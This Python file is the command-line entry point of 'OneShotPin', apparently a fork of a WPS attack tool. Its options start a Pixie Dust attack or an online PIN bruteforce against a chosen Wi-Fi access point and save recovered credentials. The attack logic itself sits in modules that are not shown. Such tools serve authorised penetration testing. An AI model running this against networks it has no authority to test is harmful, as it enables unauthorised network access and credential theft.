#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import argparse
from pathlib import Path

from .utils import ifaceUp, die
from .wifi_scanner import WiFiScanner
from .wps_connection import Companion

def usage():
    return """
OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg

%(prog)s <arguments>

Required arguments:
    -i, --interface=<wlan0>  : Name of the interface to use

Optional arguments:
    -b, --bssid=<mac>        : BSSID of the target AP
    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
    -K, --pixie-dust         : Run Pixie Dust attack
    -B, --bruteforce         : Run online bruteforce attack
    --push-button-connect    : Run WPS push button connection

Advanced arguments:
    -d, --delay=<n>          : Set the delay between pin attempts [0]
    -w, --write              : Write AP credentials to the file on success
    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
    -X, --show-pixie-cmd     : Always print Pixiewps command
    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
    --iface-down             : Down network interface when the work is finished
    -l, --loop               : Run in a loop
    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
    --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                               (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
    -v, --verbose            : Verbose output

Example:
    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
"""

def main():
    parser = argparse.ArgumentParser(
        description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg',
        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
        )

    parser.add_argument(
        '-i', '--interface',
        type=str,
        required=True,
        help='Name of the interface to use'
        )
    parser.add_argument(
        '-b', '--bssid',
        type=str,
        help='BSSID of the target AP'
        )
    parser.add_argument(
        '-p', '--pin',
        type=str,
        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
        )
    parser.add_argument(
        '-K', '--pixie-dust',
        action='store_true',
        help='Run Pixie Dust attack'
        )
    parser.add_argument(
        '-F', '--pixie-force',
        action='store_true',
        help='Run Pixiewps with --force option (bruteforce full range)'
        )
    parser.add_argument(
        '-X', '--show-pixie-cmd',
        action='store_true',
        help='Always print Pixiewps command'
        )
    parser.add_argument(
        '-B', '--bruteforce',
        action='store_true',
        help='Run online bruteforce attack'
        )
    parser.add_argument(
        '--pbc', '--push-button-connect',
        action='store_true',
        help='Run WPS push button connection'
        )
    parser.add_argument(
        '-d', '--delay',
        type=float,
        help='Set the delay between pin attempts'
        )
    parser.add_argument(
        '-w', '--write',
        action='store_true',
        help='Write credentials to the file on success'
        )
    parser.add_argument(
        '--iface-down',
        action='store_true',
        help='Down network interface when the work is finished'
        )
    parser.add_argument(
        '--vuln-list',
        type=str,
        default=os.path.dirname(os.path.realpath(__file__)) + '/../vulnwsc.txt',
        help='Use custom file with vulnerable devices list'
    )
    parser.add_argument(
        '-l', '--loop',
        action='store_true',
        help='Run in a loop'
    )
    parser.add_argument(
        '-r', '--reverse-scan',
        action='store_true',
        help='Reverse order of networks in the list of networks. Useful on small displays'
    )
    parser.add_argument(
        '--mtk-wifi',
        action='store_true',
        help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit '
             '(for internal Wi-Fi adapters implemented in MediaTek SoCs). '
             'Turn off Wi-Fi in the system settings before using this.'
    )
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Verbose output'
        )

    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die("The program requires Python 3.6 and above")
    if os.getuid() != 0:
        die("Run it as root")

    if args.mtk_wifi:
        wmtWifi_device = Path("/dev/wmtWifi")
        if not wmtWifi_device.is_char_device():
            die("Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
                "/dev/wmtWifi does not exist or it is not a character device")
        wmtWifi_device.chmod(0o644)
        wmtWifi_device.write_text("1")

    if not ifaceUp(args.interface):
        die('Unable to up interface "{}"'.format(args.interface))

    while True:
        try:
            companion = Companion(args.interface, args.write, print_debug=args.verbose)
            if args.pbc:
                companion.single_connection(pbc_mode=True)
            else:
                if not args.bssid:
                    try:
                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
                            vuln_list = file.read().splitlines()
                    except FileNotFoundError:
                        vuln_list = []
                    scanner = WiFiScanner(args.interface, vuln_list)
                    if not args.loop:
                        print('[*] BSSID not specified (--bssid) — scanning for available networks')
                    args.bssid = scanner.prompt_network()

                if args.bssid:
                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
                    if args.bruteforce:
                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                    else:
                        companion.single_connection(args.bssid, args.pin, args.pixie_dust,
                                                    args.show_pixie_cmd, args.pixie_force)
            if not args.loop:
                break
            else:
                args.bssid = None
        except KeyboardInterrupt:
            if args.loop:
                if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
                    print("Aborting…")
                    break
                else:
                    args.bssid = None
            else:
                print("\nAborting…")
                break

    if args.iface_down:
        ifaceUp(args.interface, down=True)

    if args.mtk_wifi:
        wmtWifi_device.write_text("0")

if __name__ == '__main__':
    main() 